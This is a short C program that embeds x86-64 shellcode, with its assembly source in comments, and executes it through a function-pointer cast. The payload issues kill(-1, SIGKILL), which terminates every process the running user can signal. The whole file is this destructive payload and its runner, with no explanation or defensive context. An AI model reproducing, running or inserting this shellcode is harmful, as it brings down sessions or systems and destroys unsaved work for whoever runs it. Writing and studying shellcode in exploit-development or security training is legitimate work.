
// global _start

// section .text

// _start:
    
	    
// 	push 	0x3e		; sys kill
// 	pop  	rax
// 	push 	-1 			; pid
// 	pop		rdi
// 	push	0x9			; sig kill
// 	pop 	rsi
// 	syscall


int main(void)
{
    char shellcode[] = "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";
 
    (*(void (*)()) shellcode)();
     
    return 0;
}
